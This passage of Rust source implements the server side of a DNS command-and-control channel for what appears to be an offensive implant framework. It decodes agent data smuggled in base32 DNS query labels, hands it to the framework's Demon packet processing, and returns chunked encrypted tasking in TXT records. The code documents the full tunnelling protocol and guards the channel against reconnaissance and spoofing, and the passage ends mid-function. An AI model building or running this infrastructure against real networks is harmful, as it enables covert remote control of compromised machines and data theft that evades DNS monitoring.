//! DNS C2 listener (UDP authoritative + legacy/DoH query handling).

use std::collections::HashMap;
use std::net::IpAddr;
use std::sync::Arc;
use std::time::{Duration, Instant};

use red_cell_common::DnsListenerConfig;
use tokio::net::UdpSocket;
use tokio::sync::Mutex;
use tracing::warn;

use crate::{
    AgentRegistry, CommandDispatcher, Database, DemonInitSecretConfig, DemonPacketParser,
    PluginRuntime, ShutdownController, SocketRelayManager, dispatch::DownloadTracker,
    events::EventBus,
};

use super::{
    DemonInitRateLimiter, DnsReconBlockLimiter, ListenerManagerError, ListenerRuntimeFuture,
    ReconnectProbeRateLimiter, UnknownCallbackProbeAuditLimiter, allow_demon_init_for_ip,
    is_valid_demon_callback_request, process_demon_transport,
};

// ── DNS C2 Listener ──────────────────────────────────────────────────────────

/// DNS wire-format header length in bytes.
pub(crate) const DNS_HEADER_LEN: usize = 12;
/// DNS record type for TXT records.
pub(crate) const DNS_TYPE_TXT: u16 = 16;
/// DNS record type for A records.
pub(crate) const DNS_TYPE_A: u16 = 1;
/// DNS record type for CNAME records.
pub(crate) const DNS_TYPE_CNAME: u16 = 5;
/// DNS record class IN.
pub(crate) const DNS_CLASS_IN: u16 = 1;
/// DNS flag: Query/Response bit.
pub(crate) const DNS_FLAG_QR: u16 = 0x8000;
/// DNS flag: Authoritative Answer bit.
pub(crate) const DNS_FLAG_AA: u16 = 0x0400;
/// DNS RCODE: No Error.
pub(crate) const DNS_RCODE_NOERROR: u16 = 0;
/// DNS RCODE: NXDOMAIN (name does not exist).
pub(crate) const DNS_RCODE_NXDOMAIN: u16 = 3;
/// DNS RCODE: Refused.
pub(crate) const DNS_RCODE_REFUSED: u16 = 5;
/// DNS query type for zone transfers (AXFR, RFC 5936). Blocked unconditionally.
pub(crate) const DNS_QTYPE_AXFR: u16 = 252;
/// DNS query type for "all records" (ANY/QTYPE=*, RFC 8482). Blocked unconditionally.
pub(crate) const DNS_QTYPE_ANY: u16 = 255;
/// Maximum age in seconds before a pending DNS upload is discarded.
pub(crate) const DNS_UPLOAD_TIMEOUT_SECS: u64 = 120;
/// How often the DNS listener prunes expired upload sessions.
pub(crate) const DNS_UPLOAD_CLEANUP_INTERVAL_SECS: u64 = 30;
/// Maximum number of chunks accepted for a single legacy DNS upload.
pub(crate) const DNS_MAX_UPLOAD_CHUNKS: u16 = 256;
/// Maximum chunks for Specter/Archon DoH uplink (`<seq:04x><total:04x>` in the query name).
pub(crate) const DNS_DOH_MAX_UPLOAD_CHUNKS: u16 = 1000;
/// Downlink chunk size for DoH (matches `agent/specter` `CHUNK_BYTES`).
pub(crate) const DNS_DOH_RESPONSE_CHUNK_BYTES: usize = 37;
/// Session label length (`<session_hex16>` in DoH names).
pub(crate) const DNS_DOH_SESSION_HEX_LEN: usize = 16;
/// Maximum number of concurrent DNS upload sessions retained in memory.
pub(crate) const DNS_MAX_PENDING_UPLOADS: usize = 1000;
/// Maximum number of concurrent DNS upload sessions allowed per source IP.
pub(crate) const DNS_MAX_UPLOADS_PER_IP: usize = 10;
/// Maximum number of pending DNS download responses retained in memory.
pub(crate) const DNS_MAX_PENDING_RESPONSES: usize = 1000;
/// Maximum total size (in bytes) of all pending DNS download response chunks combined.
/// Limits memory consumption when many agents have large queued responses.
pub(crate) const DNS_MAX_PENDING_RESPONSE_BYTES: usize = 8 * 1024 * 1024;
/// Maximum response chunk size in bytes (encoded as base32hex in a TXT string).
/// 200 base32hex chars × 5 bits ÷ 8 = 125 bytes.
pub(crate) const DNS_RESPONSE_CHUNK_BYTES: usize = 125;
/// Maximum number of download chunks that fit in a u16 sequence counter.
///
/// The DNS download protocol uses a u16 `seq` field, so responses that would
/// require more than 65 535 chunks cannot be delivered without silent truncation.
/// Payloads exceeding `DNS_MAX_DOWNLOAD_CHUNKS * DNS_RESPONSE_CHUNK_BYTES`
/// (~7.8 MB) are rejected at queue time.
pub(crate) const DNS_MAX_DOWNLOAD_CHUNKS: usize = u16::MAX as usize;
/// Base32hex alphabet (RFC 4648 §7): 0-9 followed by A-V.
pub(crate) const BASE32HEX_ALPHABET: &[u8; 32] = b"0123456789ABCDEFGHIJKLMNOPQRSTUV";
/// RFC 4648 base32 alphabet (lowercase).
pub(crate) const BASE32_RFC4648_ALPHABET: &[u8; 32] = b"abcdefghijklmnopqrstuvwxyz234567";

/// In-progress multi-chunk upload reassembly buffer for a DNS C2 agent.
#[derive(Debug)]
pub(crate) struct DnsPendingUpload {
    /// Received chunks indexed by sequence number.
    pub(crate) chunks: HashMap<u16, Vec<u8>>,
    /// Total number of expected chunks.
    pub(crate) total: u16,
    /// Timestamp of the first chunk (for expiry tracking).
    pub(crate) received_at: Instant,
    /// Source IP that opened this upload session (used for per-IP rate limiting).
    pub(crate) peer_ip: IpAddr,
}

/// Pre-chunked C2 response ready to be polled by a DNS agent.
///
/// Responses are **not** bound to a specific resolver IP.  DNS recursive
/// resolvers may rotate source addresses between an upload and the
/// follow-up download, so pinning to `peer_ip` would strand legitimate
/// agents.  Anti-spoofing is handled by the per-agent AES-256-CTR
/// encryption — only the holder of the agent key can decrypt the payload.
#[derive(Debug)]
pub(crate) struct DnsPendingResponse {
    /// Base32hex-encoded response chunks.
    pub(crate) chunks: Vec<String>,
    /// Timestamp of when the response was queued for download.
    pub(crate) received_at: Instant,
}

#[derive(Debug, PartialEq, Eq)]
pub(crate) enum DnsUploadAssembly {
    Pending,
    Complete(Vec<u8>),
    Rejected,
}

/// Shared runtime state for the DNS C2 listener.
///
/// # DNS C2 Protocol
///
/// All DNS queries targeting the configured [`DnsListenerConfig::domain`] are
/// treated as C2 traffic. Two query sub-types are supported:
///
/// ## Upload (agent → teamserver)
///
/// ```text
/// <B32HEX-CHUNK>.<SEQ>-<TOTAL>-<AGENTID>.up.<DOMAIN>
/// ```
///
/// * `B32HEX-CHUNK` — base32hex-encoded data slice (max 39 bytes per label)
/// * `SEQ` — zero-based hex chunk index
/// * `TOTAL` — hex total chunk count
/// * `AGENTID` — 8-character lowercase hex agent identifier
///
/// The listener acknowledges each chunk with a TXT response:
/// * `ok`  — chunk stored; more chunks expected
/// * `ack` — all chunks received and the Demon packet was processed
/// * `err` — reassembly or Demon protocol error
///
/// ## Download (teamserver → agent)
///
/// ```text
/// <SEQ>-<AGENTID>.dn.<DOMAIN>
/// ```
///
/// The server responds with a TXT record:
/// * `wait`              — no response queued for this agent
/// * `<TOTAL> <B32HEX>` — total chunk count and the requested chunk
/// * `done`              — `SEQ` is past the end of the response
///
/// ## Specter/Archon DoH grammar (same DNS listener, UDP authoritative)
///
/// Uplink (agent → teamserver), one TXT query per chunk:
/// ```text
/// <base32/rfc4648>.<seq:04x><total:04x>.<session_hex16>.u.<DOMAIN>
/// ```
///
/// * `session_hex16` — 16 lowercase hex chars (8 random bytes)
/// * Uplink chunks are acknowledged with **NXDOMAIN** (no TXT body)
///
/// Ready poll:
/// ```text
/// rdy.<session_hex16>.d.<DOMAIN>
/// ```
///
/// * While the response is not ready: **NXDOMAIN**
/// * When ready: TXT `\<total_chunks\>` as lowercase hexadecimal (no `0x` prefix)
///
/// Chunk fetch:
/// ```text
/// <seq:04x>.<session_hex16>.d.<DOMAIN>
/// ```
///
/// * TXT record: **only** the base32/RFC4648 payload for that chunk (no `TOTAL` prefix)
#[derive(Debug)]
pub(crate) struct DnsListenerState {
    pub(crate) config: DnsListenerConfig,
    pub(crate) registry: AgentRegistry,
    pub(crate) database: Database,
    pub(crate) parser: DemonPacketParser,
    pub(crate) events: EventBus,
    pub(crate) dispatcher: CommandDispatcher,
    pub(crate) demon_init_rate_limiter: DemonInitRateLimiter,
    pub(crate) unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    pub(crate) reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    /// Rate limiter that blocks IPs sending repeated AXFR/ANY recon queries.
    pub(crate) dns_recon_block_limiter: DnsReconBlockLimiter,
    pub(crate) shutdown: ShutdownController,
    /// Pending uploads keyed by agent ID.
    pub(crate) uploads: Mutex<HashMap<u32, DnsPendingUpload>>,
    /// Pending responses keyed by agent ID.
    pub(crate) responses: Mutex<HashMap<u32, DnsPendingResponse>>,
    /// DoH-style uploads keyed by session (16 hex chars).
    pub(crate) doh_uploads: Mutex<HashMap<String, DnsPendingUpload>>,
    /// DoH-style responses keyed by session; chunk strings are RFC4648 base32.
    pub(crate) doh_responses: Mutex<HashMap<String, DnsPendingResponse>>,
}

impl DnsListenerState {
    #[allow(clippy::too_many_arguments)]
    pub(crate) fn new(
        config: &DnsListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        downloads: DownloadTracker,
        demon_init_rate_limiter: DemonInitRateLimiter,
        unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
        reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
        dns_recon_block_limiter: DnsReconBlockLimiter,
        shutdown: ShutdownController,
        init_secret_config: DemonInitSecretConfig,
        max_pivot_chain_depth: usize,
        allow_legacy_ctr: bool,
    ) -> Self {
        Self {
            config: config.clone(),
            registry: registry.clone(),
            database: database.clone(),
            parser: DemonPacketParser::with_init_secret_config(
                registry.clone(),
                init_secret_config.clone(),
            )
            .with_allow_legacy_ctr(allow_legacy_ctr),
            events: events.clone(),
            dispatcher: CommandDispatcher::with_builtin_handlers_and_downloads(
                registry.clone(),
                events.clone(),
                database,
                sockets,
                plugins,
                downloads,
                max_pivot_chain_depth,
                allow_legacy_ctr,
                init_secret_config,
            ),
            demon_init_rate_limiter,
            unknown_callback_probe_audit_limiter,
            reconnect_probe_rate_limiter,
            dns_recon_block_limiter,
            shutdown,
            uploads: Mutex::new(HashMap::new()),
            responses: Mutex::new(HashMap::new()),
            doh_uploads: Mutex::new(HashMap::new()),
            doh_responses: Mutex::new(HashMap::new()),
        }
    }

    pub(crate) async fn handle_dns_packet(&self, buf: &[u8], peer_ip: IpAddr) -> Option<Vec<u8>> {
        let query = parse_dns_query(buf)?;

        // AXFR and ANY queries have no legitimate use on a C2 DNS listener and
        // are indicators of active zone enumeration or DNS amplification probing.
        // Block them before any C2 parsing, log at WARN, and rate-limit repeat
        // offenders so the log stays actionable (silent drop after threshold).
        if query.qtype == DNS_QTYPE_AXFR || query.qtype == DNS_QTYPE_ANY {
            let below_threshold = self.dns_recon_block_limiter.allow(peer_ip).await;
            if below_threshold {
                warn!(
                    listener = %self.config.name,
                    %peer_ip,
                    qtype = query.qtype,
                    "dns recon query detected (AXFR/ANY) — returning REFUSED"
                );
                return Some(build_dns_refused_response(query.id));
            } else {
                warn!(
                    listener = %self.config.name,
                    %peer_ip,
                    qtype = query.qtype,
                    "dns recon query from repeat offender — dropping without response"
                );
                return None;
            }
        }

        let Some(allowed_qtypes) = dns_allowed_query_types(&self.config.record_types) else {
            warn!(
                listener = %self.config.name,
                record_types = %self.config.record_types.join(","),
                "dns listener has unsupported record type configuration"
            );
            return Some(build_dns_refused_response(query.id));
        };

        if !allowed_qtypes.contains(&query.qtype) {
            return Some(build_dns_refused_response(query.id));
        }

        let Some(c2_query) = parse_dns_c2_query(&query.labels, &self.config.domain) else {
            return Some(build_dns_refused_response(query.id));
        };

        match c2_query {
            DnsC2Query::Upload { agent_id, seq, total, data } => {
                let txt = self.handle_upload(agent_id, seq, total, data, peer_ip).await;
                Some(self.dns_c2_response_or_refused(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
            DnsC2Query::Download { agent_id, seq } => {
                let txt = self.handle_download(agent_id, seq).await;
                Some(self.dns_c2_response_or_refused(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
            DnsC2Query::DohUpload { session, seq, total, data } => {
                let ok = self.handle_doh_upload(session, seq, total, data, peer_ip).await;
                if ok {
                    Some(build_dns_nxdomain_response(query.id, &query.qname_raw, query.qtype))
                } else {
                    Some(build_dns_refused_response(query.id))
                }
            }
            DnsC2Query::DohReady { session } => match self.handle_doh_ready(&session).await {
                Some(total_chunks) => {
                    let txt = format!("{total_chunks:x}");
                    Some(self.dns_c2_response_or_refused(
                        query.id,
                        &query.qname_raw,
                        query.qtype,
                        txt.as_bytes(),
                    ))
                }
                None => Some(build_dns_nxdomain_response(query.id, &query.qname_raw, query.qtype)),
            },
            DnsC2Query::DohDownload { session, seq } => {
                let txt = self.handle_doh_download(&session, seq).await;
                Some(self.dns_c2_response_or_refused(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
        }
    }

    /// Build a DNS response for the C2 payload, or REFUSED when the payload cannot be encoded
    /// for the query type (for example, payloads longer than four octets for `A` queries).
    pub(crate) fn dns_c2_response_or_refused(
        &self,
        query_id: u16,
        qname_raw: &[u8],
        qtype: u16,
        payload: &[u8],
    ) -> Vec<u8> {
        match build_dns_c2_response(query_id, qname_raw, qtype, payload) {
            Some(resp) => resp,
            None => {
                warn!(
                    listener = %self.config.name,
                    qtype,
                    payload_len = payload.len(),
                    "dns c2 response cannot be encoded for this query type; sending REFUSED"
                );
                build_dns_refused_response(query_id)
            }
        }
    }

    pub(crate) async fn handle_upload(
        &self,
        agent_id: u32,
        seq: u16,
        total: u16,
        data: Vec<u8>,
        peer_ip: IpAddr,
    ) -> &'static str {
        let assembled = match self.try_assemble_upload(agent_id, seq, total, data, peer_ip).await {
            DnsUploadAssembly::Pending => return "ok",
            DnsUploadAssembly::Rejected => return "err",
            DnsUploadAssembly::Complete(assembled) => assembled,
        };

        let Some(_callback_guard) = self.shutdown.try_track_callback() else {
            return "err";
        };

        if !is_valid_demon_callback_request(&assembled) {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                "dns upload produced invalid demon packet; discarding"
            );
            return "err";
        }

        if !allow_demon_init_for_ip(
            &self.config.name,
            &self.demon_init_rate_limiter,
            peer_ip,
            &assembled,
        )
        .await
        {
            return "err";
        }

        match process_demon_transport(
            &self.config.name,
            &self.registry,
            &self.database,
            &self.parser,
            &self.events,
            &self.dispatcher,
            &self.unknown_callback_probe_audit_limiter,
            &self.reconnect_probe_rate_limiter,
            &self.demon_init_rate_limiter,
            &assembled,
            peer_ip.to_string(),
        )
        .await
        {
            Ok(response) => {
                if !response.payload.is_empty() {
                    let chunks = chunk_response_to_b32hex(&response.payload);
                    if chunks.len() > DNS_MAX_DOWNLOAD_CHUNKS {
                        warn!(
                            listener = %self.config.name,
                            agent_id = format_args!("{agent_id:08X}"),
                            payload_bytes = response.payload.len(),
                            chunk_count = chunks.len(),
                            max_chunks = DNS_MAX_DOWNLOAD_CHUNKS,
                            "dns response exceeds u16 seq limit — dropping to prevent \
                             silent truncation"
                        );
                        return "err";
                    }
                    let mut responses = self.responses.lock().await;
                    let accepted = Self::enforce_response_caps(
                        &mut responses,
                        agent_id,
                        &chunks,
                        &self.config.name,
                    );
                    if !accepted {
                        return "err";
                    }
                    responses.insert(
                        agent_id,
                        DnsPendingResponse { chunks, received_at: Instant::now() },
                    );
                    drop(responses);
                }
                "ack"
            }
            Err(error) => {
                warn!(
                    listener = %self.config.name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %error,
                    "dns upload demon processing failed"
                );
                "err"
            }
        }
    }

    /// Compute the total buffered bytes across all pending responses.
    pub(crate) fn pending_response_bytes(responses: &HashMap<u32, DnsPendingResponse>) -> usize {
        responses.values().map(|r| r.chunks.iter().map(|c| c.len()).sum::<usize>()).sum()
    }

    /// Enforce count and byte caps on the pending response map.
    ///
    /// If inserting a new response for `incoming_agent_id` would exceed either
    /// `DNS_MAX_PENDING_RESPONSES` (count) or `DNS_MAX_PENDING_RESPONSE_BYTES`
    /// (total memory), the oldest entries are evicted until there is room.
    /// If the incoming entry itself already exists, it will be replaced in-place
    /// and does not count toward the limit.
    ///
    /// Returns `true` if the caller should proceed with the insert, or `false`
    /// if the incoming response alone exceeds the byte cap and must be rejected.
    pub(crate) fn enforce_response_caps(
        responses: &mut HashMap<u32, DnsPendingResponse>,
        incoming_agent_id: u32,
        incoming_chunks: &[String],
        listener_name: &str,
    ) -> bool {
        // If this is a replacement for an existing agent, remove the old entry
        // first so it doesn't count against the caps.
        let replaced = responses.remove(&incoming_agent_id);

        let incoming_bytes: usize = incoming_chunks.iter().map(|c| c.len()).sum();

        // --- count cap ---
        while responses.len() >= DNS_MAX_PENDING_RESPONSES {
            let oldest_id = responses.iter().min_by_key(|(_, r)| r.received_at).map(|(&id, _)| id);
            let Some(evict_id) = oldest_id else { break };
            warn!(
                listener = %listener_name,
                evicted_agent_id = format_args!("{evict_id:08X}"),
                pending_count = responses.len(),
                max = DNS_MAX_PENDING_RESPONSES,
                "evicting oldest pending DNS response — count cap reached"
            );
            responses.remove(&evict_id);
        }

        // --- byte cap ---
        let mut total_bytes = Self::pending_response_bytes(responses);
        while total_bytes + incoming_bytes > DNS_MAX_PENDING_RESPONSE_BYTES && !responses.is_empty()
        {
            let oldest_id = responses.iter().min_by_key(|(_, r)| r.received_at).map(|(&id, _)| id);
            let Some(evict_id) = oldest_id else { break };
            let evicted_bytes: usize = responses
                .get(&evict_id)
                .map(|r| r.chunks.iter().map(|c| c.len()).sum())
                .unwrap_or(0);
            warn!(
                listener = %listener_name,
                evicted_agent_id = format_args!("{evict_id:08X}"),
                total_bytes,
                incoming_bytes,
                max_bytes = DNS_MAX_PENDING_RESPONSE_BYTES,
                "evicting oldest pending DNS response — byte cap reached"
            );
            responses.remove(&evict_id);
            total_bytes -= evicted_bytes;
        }

        // If the incoming response alone exceeds the byte cap, reject it.
        if incoming_bytes > DNS_MAX_PENDING_RESPONSE_BYTES {
            warn!(
                listener = %listener_name,
                agent_id = format_args!("{incoming_agent_id:08X}"),
                incoming_bytes,
                max_bytes = DNS_MAX_PENDING_RESPONSE_BYTES,
                "rejecting oversized DNS response — single entry exceeds byte cap"
            );
            // Restore the replaced entry if we had one, since we're rejecting
            // the new response.
            if let Some(old) = replaced {
                responses.insert(incoming_agent_id, old);
            }
            return false;
        }

        // Re-insert the replaced entry if nothing was evicted and we had one —
        // but actually we don't: we've already removed it above, and the caller
        // will insert the new value.  We just need to NOT restore the old entry.
        let _ = replaced;
        true
    }

    pub(crate) fn pending_doh_response_bytes(
        responses: &HashMap<String, DnsPendingResponse>,
    ) -> usize {
        responses.values().map(|r| r.chunks.iter().map(|c| c.len()).sum::<usize>()).sum()
    }

    /// Same limits as [`Self::enforce_response_caps`], for session-keyed DoH responses.
    pub(crate) fn enforce_doh_response_caps(
        responses: &mut HashMap<String, DnsPendingResponse>,
        incoming_session: &str,
        incoming_chunks: &[String],
        listener_name: &str,
    ) -> bool {
        let replaced = responses.remove(incoming_session);

        let incoming_bytes: usize = incoming_chunks.iter().map(|c| c.len()).sum();

        while responses.len() >= DNS_MAX_PENDING_RESPONSES {
            let oldest_id =
                responses.iter().min_by_key(|(_, r)| r.received_at).map(|(id, _)| id.clone());
            let Some(evict_id) = oldest_id else { break };
            warn!(
                listener = %listener_name,
                evicted_session = %evict_id,
                pending_count = responses.len(),
                max = DNS_MAX_PENDING_RESPONSES,
                "evicting oldest pending DoH DNS response — count cap reached"
            );
            responses.remove(&evict_id);
        }

        let mut total_bytes = Self::pending_doh_response_bytes(responses);
        while total_bytes + incoming_bytes > DNS_MAX_PENDING_RESPONSE_BYTES && !responses.is_empty()
        {
            let oldest_id =
                responses.iter().min_by_key(|(_, r)| r.received_at).map(|(id, _)| id.clone());
            let Some(evict_id) = oldest_id else { break };
            let evicted_bytes: usize = responses
                .get(&evict_id)
                .map(|r| r.chunks.iter().map(|c| c.len()).sum())
                .unwrap_or(0);
            warn!(
                listener = %listener_name,
                evicted_session = %evict_id,
                total_bytes,
                incoming_bytes,
                max_bytes = DNS_MAX_PENDING_RESPONSE_BYTES,
                "evicting oldest pending DoH DNS response — byte cap reached"
            );
            responses.remove(&evict_id);
            total_bytes -= evicted_bytes;
        }

        if incoming_bytes > DNS_MAX_PENDING_RESPONSE_BYTES {
            warn!(
                listener = %listener_name,
                session = %incoming_session,
                incoming_bytes,
                max_bytes = DNS_MAX_PENDING_RESPONSE_BYTES,
                "rejecting oversized DoH DNS response — single entry exceeds byte cap"
            );
            if let Some(old) = replaced {
                responses.insert(incoming_session.to_owned(), old);
            }
            return false;
        }

        let _ = replaced;
        true
    }

    pub(crate) async fn cleanup_expired_uploads(&self) {
        let mut uploads = self.uploads.lock().await;
        uploads
            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
        drop(uploads);

        let mut doh_uploads = self.doh_uploads.lock().await;
        doh_uploads
            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
        drop(doh_uploads);

        let mut responses = self.responses.lock().await;
        responses
            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
        drop(responses);

        let mut doh_responses = self.doh_responses.lock().await;
        doh_responses
            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
    }

    pub(crate) async fn handle_download(&self, agent_id: u32, seq: u16) -> String {
        if self.registry.get(agent_id).await.is_none() {
            return "wait".to_owned();
        }

        let mut responses = self.responses.lock().await;
        let Some(pending) = responses.get(&agent_id) else {
            return "wait".to_owned();
        };

        let idx = usize::from(seq);
        let total = pending.chunks.len();
        if idx >= total {
            responses.remove(&agent_id);
            "done".to_owned()
        } else {
            format!("{} {}", total, pending.chunks[idx])
        }
    }

    pub(crate) async fn handle_doh_upload(
        &self,
        session: String,
        seq: u16,
        total: u16,
        data: Vec<u8>,
        peer_ip: IpAddr,
    ) -> bool {
        let assembled =
            match self.try_assemble_doh_upload(&session, seq, total, data, peer_ip).await {
                DnsUploadAssembly::Pending => return true,
                DnsUploadAssembly::Rejected => return false,
                DnsUploadAssembly::Complete(assembled) => assembled,
            };

        let Some(_callback_guard) = self.shutdown.try_track_callback() else {
            return false;
        };

        if !is_valid_demon_callback_request(&assembled) {
            warn!(
                listener = %self.config.name,
                session = %session,
                "dns doh upload produced invalid demon packet; discarding"
            );
            return false;
        }

        if !allow_demon_init_for_ip(
            &self.config.name,
            &self.demon_init_rate_limiter,
            peer_ip,
            &assembled,
        )
        .await
        {
            return false;
        }

        match process_demon_transport(
            &self.config.name,
            &self.registry,
            &self.database,
            &self.parser,
            &self.events,
            &self.dispatcher,
            &self.unknown_callback_probe_audit_limiter,
            &self.reconnect_probe_rate_limiter,
            &self.demon_init_rate_limiter,
            &assembled,
            peer_ip.to_string(),
        )
        .await
        {
            Ok(response) => {
                if !response.payload.is_empty() {
                    let chunks = chunk_response_to_doh_b32(&response.payload);
                    if chunks.len() > DNS_MAX_DOWNLOAD_CHUNKS {
                        warn!(
                            listener = %self.config.name,
                            session = %session,
                            payload_bytes = response.payload.len(),
                            chunk_count = chunks.len(),
                            max_chunks = DNS_MAX_DOWNLOAD_CHUNKS,
                            "dns doh response exceeds u16 seq limit — dropping to prevent \
                             silent truncation"
                        );
                        return false;
                    }
                    let mut responses = self.doh_responses.lock().await;
                    let accepted = Self::enforce_doh_response_caps(
                        &mut responses,
                        &session,
                        &chunks,
                        &self.config.name,
                    );
                    if !accepted {
                        return false;
                    }
                    responses.insert(
                        session,
                        DnsPendingResponse { chunks, received_at: Instant::now() },
                    );
                }
                true
            }
            Err(error) => {
                warn!(
                    listener = %self.config.name,
                    session = %session,
                    %error,
                    "dns doh upload demon processing failed"
                );
                false
            }
        }
    }

    /// `Some(n)` = ready with `n` total chunks; `None` = still processing (NXDOMAIN to client).
    pub(crate) async fn handle_doh_ready(&self, session: &str) -> Option<usize> {
        let responses = self.doh_responses.lock().await;
        responses.get(session).map(|p| p.chunks.len())
    }

    pub(crate) async fn handle_doh_download(&self, session: &str, seq: u16) -> String {
        let mut responses = self.doh_responses.lock().await;
        let Some(pending) = responses.get(session) else {
            return "wait".to_owned();
        };

        let idx = usize::from(seq);
        let total = pending.chunks.len();
        if idx >= total {
            responses.remove(session);
            return "done".to_owned();
        }
        pending.chunks[idx].clone()
    }

    /// Try to assemble a complete upload from buffered chunks.
    ///
    /// Returns [`DnsUploadAssembly::Complete`] when all chunks are present,
    /// [`DnsUploadAssembly::Pending`] while more chunks are still expected,
    /// and [`DnsUploadAssembly::Rejected`] when the upload metadata or state is invalid.
    pub(crate) async fn try_assemble_upload(
        &self,
        agent_id: u32,
        seq: u16,
        total: u16,
        data: Vec<u8>,
        peer_ip: IpAddr,
    ) -> DnsUploadAssembly {
        if total == 0 || total > DNS_MAX_UPLOAD_CHUNKS {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                seq,
                total,
                max_total = DNS_MAX_UPLOAD_CHUNKS,
                "dns upload rejected due to invalid total chunk count"
            );
            return DnsUploadAssembly::Rejected;
        }

        if seq >= total {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                seq,
                total,
                "dns upload rejected because chunk sequence exceeds declared total"
            );
            return DnsUploadAssembly::Rejected;
        }

        let mut uploads = self.uploads.lock().await;

        if let Some(existing) = uploads.get(&agent_id) {
            if existing.peer_ip != peer_ip {
                // A different source IP is referencing an agent_id that already has an
                // in-progress upload.  Reject the imposter without touching the legitimate
                // session — clearing the session here is exactly what a DoS attacker would
                // exploit (they can see agent IDs in plaintext DNS labels).
                warn!(
                    listener = %self.config.name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %peer_ip,
                    expected_peer_ip = %existing.peer_ip,
                    "dns upload rejected due to source IP mismatch; possible agent_id spoofing"
                );
                return DnsUploadAssembly::Rejected;
            }

            if existing.total != total {
                warn!(
                    listener = %self.config.name,
                    agent_id = format_args!("{agent_id:08X}"),
                    received_total = total,
                    expected_total = existing.total,
                    "dns upload rejected due to inconsistent chunk total"
                );
                uploads.remove(&agent_id);
                return DnsUploadAssembly::Rejected;
            }
        }

        if !uploads.contains_key(&agent_id) && uploads.len() >= DNS_MAX_PENDING_UPLOADS {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                active_uploads = uploads.len(),
                max_uploads = DNS_MAX_PENDING_UPLOADS,
                "dns upload rejected because pending upload capacity has been reached"
            );
            return DnsUploadAssembly::Rejected;
        }

        if !uploads.contains_key(&agent_id) {
            let ip_count = uploads.values().filter(|u| u.peer_ip == peer_ip).count();
            if ip_count >= DNS_MAX_UPLOADS_PER_IP {
                warn!(
                    listener = %self.config.name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %peer_ip,
                    ip_count,
                    max_per_ip = DNS_MAX_UPLOADS_PER_IP,
                    "dns upload rejected because per-IP upload limit has been reached"
                );
                return DnsUploadAssembly::Rejected;
            }
        }

        let entry = uploads.entry(agent_id).or_insert_with(|| DnsPendingUpload {
            chunks: HashMap::new(),
            total,
            received_at: Instant::now(),
            peer_ip,
        });
        entry.chunks.insert(seq, data);

        let expected = entry.total;
        if entry.chunks.len() < usize::from(expected) {
            return DnsUploadAssembly::Pending;
        }

        // All chunks present — assemble in order
        let mut assembled = Vec::new();
        for i in 0..expected {
            match entry.chunks.get(&i) {
                Some(chunk) => assembled.extend_from_slice(chunk),
                None => {
                    warn!(
                        listener = %self.config.name,
                        agent_id = format_args!("{agent_id:08X}"),
                        "dns upload missing chunk {i}/{expected}; discarding"
                    );
                    uploads.remove(&agent_id);
                    return DnsUploadAssembly::Rejected;
                }
            }
        }
        uploads.remove(&agent_id);
        DnsUploadAssembly::Complete(assembled)
    }

    pub(crate) async fn try_assemble_doh_upload(
        &self,
        session: &str,
        seq: u16,
        total: u16,
        data: Vec<u8>,
        peer_ip: IpAddr,
    ) -> DnsUploadAssembly {
        if total == 0 || total > DNS_DOH_MAX_UPLOAD_CHUNKS {
            warn!(
                listener = %self.config.name,
                %session,
                seq,
                total,
                max_total = DNS_DOH_MAX_UPLOAD_CHUNKS,
                "dns doh upload rejected due to invalid total chunk count"
            );
            return DnsUploadAssembly::Rejected;
        }

        if seq >= total {
            warn!(
                listener = %self.config.name,
                %session,
                seq,
                total,
                "dns doh upload rejected because chunk sequence exceeds declared total"
            );
            return DnsUploadAssembly::Rejected;
        }

        let uploads = self.uploads.lock().await;
        let legacy_count = uploads.len();
        let mut doh_uploads = self.doh_uploads.lock().await;

        if let Some(existing) = doh_uploads.get(session) {
            if existing.peer_ip != peer_ip {
                warn!(
                    listener = %self.config.name,
                    %session,
                    %peer_ip,
                    expected_peer_ip = %existing.peer_ip,
                    "dns doh upload rejected due to source IP mismatch"
                );
                return DnsUploadAssembly::Rejected;
            }

            if existing.total != total {
                warn!(
                    listener = %self.config.name,
                    %session,
                    received_total = total,
                    expected_total = existing.total,
                    "dns doh upload rejected due to inconsistent chunk total"
                );
                doh_uploads.remove(session);
                return DnsUploadAssembly::Rejected;
            }
        }

        let combined_uploads = legacy_count + doh_uploads.len();
        if !doh_uploads.contains_key(session) && combined_uploads >= DNS_MAX_PENDING_UPLOADS {
            warn!(
                listener = %self.config.name,
                %session,
                active_uploads = combined_uploads,
                max_uploads = DNS_MAX_PENDING_UPLOADS,
                "dns doh upload rejected because pending upload capacity has been reached"
            );
            return DnsUploadAssembly::Rejected;
        }

        if !doh_uploads.contains_key(session) {
            let ip_count = uploads.values().filter(|u| u.peer_ip == peer_ip).count()
                + doh_uploads.values().filter(|u| u.peer_ip == peer_ip).count();
            if ip_count >= DNS_MAX_UPLOADS_PER_IP {
                warn!(
                    listener = %self.config.name,
                    %session,
                    %peer_ip,
                    ip_count,
                    max_per_ip = DNS_MAX_UPLOADS_PER_IP,
                    "dns doh upload rejected because per-IP upload limit has been reached"
                );
                return DnsUploadAssembly::Rejected;
